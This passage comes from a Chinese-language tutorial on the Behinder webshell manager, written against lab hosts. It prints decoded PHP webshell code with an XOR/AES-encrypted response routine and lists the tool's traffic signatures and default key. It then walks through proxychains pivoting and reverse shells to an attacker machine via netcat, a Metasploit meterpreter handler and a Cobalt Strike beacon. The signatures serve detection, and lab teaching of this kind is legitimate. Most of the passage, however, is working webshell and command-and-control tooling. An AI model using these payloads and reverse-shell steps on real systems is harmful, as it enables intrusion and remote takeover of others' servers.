oJGNvbnRlbnQpOw0KbWFpbigkY29udGVudCk7'));
```

![image-20241031001306984](https://image.201068.xyz/assets/7.WebShell管理工具讲解/image-20241031001306984.png)

```bash
@error_reporting(0);
function main($content)
{
	$result = array();
	$result["status"] = base64_encode("success");
    $result["msg"] = base64_encode($content);
    @session_start();  //初始化session，避免connect之后直接background，后续getresult无法获取cookie

    echo encrypt(json_encode($result));
}

function Encrypt($data)
{
 @session_start();
    $key = $_SESSION['k'];
	if(!extension_loaded('openssl'))
    	{
    		for($i=0;$i<strlen($data);$i++) {
    			 $data[$i] = $data[$i]^$key[$i+1&15];
    			}
			return $data;
    	}
    else
    	{
    		return openssl_encrypt($data, "AES128", $key);
    	}
}
$content="M1p0YjJkQ3pKQ3NsOW00ZE9Yd3BVYUVCalZKcUh1YTlxMzVlQXpVQ3VyNEtkd1VrVzZrOEpBN21iMnNvMzRONWVOMkE1aTE5NHNpbTd0ZlpoUkgyV0JxNDBmYTZERXoydnpsUE1qaGJ5eXEwYmlrc1VhWTd5VXJlekc2NDBkTjZTWlVrRXhRU0xGOVlFT1BMNnRQZWRVS21KWXlWQUpkQUh5WmJMaDNnNWcyU1lidFlPbklxcTZqemxUeGY5NDNQYmdQbW9ndmxWcGw4clVMOVo0MmpsSGxJaXZZbzVZSDZRTGMyVGVZT2NXUUFyV3QyWk1hNTlJS2hBYmxqY1JFa2lWb1Jtd0FSbEI4cEtnTDFPVHFJT3lWUnNxSW04S3BqUUlLSFZWOFNCcFlmb3ZpS3ZwQUtxWlZETzhuYnpueGhHZ1hkWXhEaXp3WUlUb1JJWGpCZzFtY2FkMFRGTGRrUFlHVkhZN0U2WkFnMVRKNE5yZjl3VUd0a3prREs0Qm9aalFXOWRjQkNkSlMwMnhHUHA4eUV5eGd1YlNMcUtSNjFnUTFtNk5nUm5OSG9vREdEdzNkM0s2UFRGMEZHSkU5VmR1ZWFnVmNrRGZtamFnbUNENXBaRlJjN2M1Vm9JMm81YUMxVkJGTW1VQXo1S0JNV0Z6Z00xbTUxZ2xJcTdaZHBnYlY3UVNSeUgycWVqQnhnbVJjMzZhS0lpb1BzdEZ3dERuYlYxT2JnSlZtUXZnU2JhNHpJVVlJQ0JHS2xDU2V5cHFwZXk2a1QyektlMWJKMElZWWQ4SXcwVXpMRnZ0Z2o3a3R2ZEhzanBubEhKYkx1UFh3N3p5MUJ5aTdrazA4clJEdTRUa3daYVJnSDhJSkpDY1A2UHliamFsUmZROFlnY0ZJbEt3bW9hRzRpejI5WEFOVnlMVGdqWjAxQUt1aEZHNFNjSEZtMGZDWE9TMHBIc2JWZXQ2OG1FZnJZNjFVRjhSZ0dlb0NFUUJtTEgyR0w5dFF1cGhBN0VFT3Q4NFpUQ0g0QzJPN3YwREoyVXpSelBkS1l3OGhPalZ5VEs=";$content=base64_decode($content);
main($content);
```



### 流量特征

#### 冰蝎设置burp代理

![image-20240901090302137](https://image.201068.xyz/assets/7.WebShell管理工具讲解/image-20240901090302137.png)

##### burp抓包

![image-20240901090418041](https://image.201068.xyz/assets/7.WebShell管理工具讲解/image-20240901090418041.png)

![image-20240901090529314](https://image.201068.xyz/assets/7.WebShell管理工具讲解/image-20240901090529314.png)

#### 总结

##### 1.冰蝎的key

冰蝎的key为`e45e329feb5d925`，

连接密码32位md5值的前16位，默认连接密码`rebeyond`

##### 2.Accept

```bash
application/json, text/javascript, */*; q=0.01
```

##### 3.Content-type: 

```
Application/x-www-form-urlencoded 
```

##### 4.请求头固定

请求头： `dFAXQV1LORcHRQtLRlwMAhwFTAg/M` 

解密后：`@error_reporting(0);`

![image-20240901090952339](https://image.201068.xyz/assets/7.WebShell管理工具讲解/image-20240901090952339.png)

![image-20240901091029930](https://image.201068.xyz/assets/7.WebShell管理工具讲解/image-20240901091029930.png)



### 端口映射

> 靶机ip:192.168.70.21
>
> vps的ip:192.168.70.4

![image-20241030104612327](https://image.201068.xyz/assets/7.WebShell管理工具讲解/image-20241030104612327.png)

```bash
rdesktop 192.168.70.4
```

![image-20241030104535530](https://image.201068.xyz/assets/7.WebShell管理工具讲解/image-20241030104535530.png)

### socs5代理

#### 开启socs5服务端

![image-20241030104724428](https://image.201068.xyz/assets/7.WebShell管理工具讲解/image-20241030104724428.png)

#### 配置proxychains

```bash
vim /etc/proxychains4.conf
```

![image-20241030105055258](https://image.201068.xyz/assets/7.WebShell管理工具讲解/image-20241030105055258.png)

#### 使用socs5代理

攻击机：192.168.70.4

靶机1：192.168.70.21，192.168.30.10

靶机2：192.168.30.11

```bash
proxychains rdesktop 192.168.30.11
```

![image-20241030120324300](https://image.201068.xyz/assets/7.WebShell管理工具讲解/image-20241030120324300.png)

### 反弹shell

#### shell

##### kali监听

```bash
nc -lvvp 4444
```

![image-20241030121741144](https://image.201068.xyz/assets/7.WebShell管理工具讲解/image-20241030121741144.png)

##### 冰蝎反弹连接

> kali的ip：192.168.70.4
>
> kali监听端口：4444

![image-20241030121821885](https://image.201068.xyz/assets/7.WebShell管理工具讲解/image-20241030121821885.png)

##### 执行命令

```bash
chcp 65001
whoami
```

![image-20241030121924346](https://image.201068.xyz/assets/7.WebShell管理工具讲解/image-20241030121924346.png)

#### Metepreter

##### msf监听

```bash
msfconsole
use exploit/multi/handler 
set payload php/meterpreter/reverse_tcp
set lhost 0.0.0.0
run
```

![image-20241030113724442](https://image.201068.xyz/assets/7.WebShell管理工具讲解/image-20241030113724442.png)

##### 冰蝎连接

![image-20241030122933976](https://image.201068.xyz/assets/7.WebShell管理工具讲解/image-20241030122933976.png)

##### 执行命令

```bash
getuid
```

![image-20241030123018218](https://image.201068.xyz/assets/7.WebShell管理工具讲解/image-20241030123018218.png)

#### Cobalt Strike

冰蝎支持Java和Aspx版本的CobaltStrike一键上线功能，采用windows/beacon_https/reverse_https上线方式。

> 需要是java和Aspx的webshell

##### cs监听

```bash
windows/beacon_https/reverse_https
```

![image-20241030123542286](https://image.201068.xyz/assets/7.WebShell管理工具讲解/image-20241030123542286.png)

![image-20241030123628640](https://image.201068.xyz/assets/7.WebShell管理工具讲解/image-20241030123628640.png)

### 数据库管理

```bash
mysql://root:root@127.0.0.1:3306/mysql
```

![image-20241030115338337](https://image.201068.xyz/assets/7.WebShell管理工具讲解/image-20241030115338337.png)
